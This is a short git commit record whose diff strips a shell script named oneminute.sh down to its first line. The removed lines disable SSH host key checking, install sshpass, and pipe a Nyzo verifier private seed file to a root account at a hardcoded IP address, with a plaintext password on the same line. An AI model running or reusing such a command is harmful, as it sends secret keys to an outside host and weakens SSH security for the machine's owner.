1e2edfac602f30c0b7f0e96d677513b6d68480fa
junscapital <52300722+junscapital@users.noreply.github.com>
2019-12-11 14:34:00 +0800

    Update oneminute.sh

--- oneminute.sh
+++ oneminute.sh
@@ -1,6 +1,1 @@
 #!/bin/sh
-sudo su
-sudo echo 'StrictHostKeyChecking no'>>/etc/ssh/ssh_config
-sudo apt update
-sudo dpkg --configure -a
-sudo apt-get -yqq -f install && sudo apt-get -yqq install sshpass && cat /var/lib/nyzo/production/verifier_private_seed | sshpass -p 'Din1@3456' ssh root@167.172.247.243 'cat - >> /var/lib/nyzo/production/managed_verifiers'
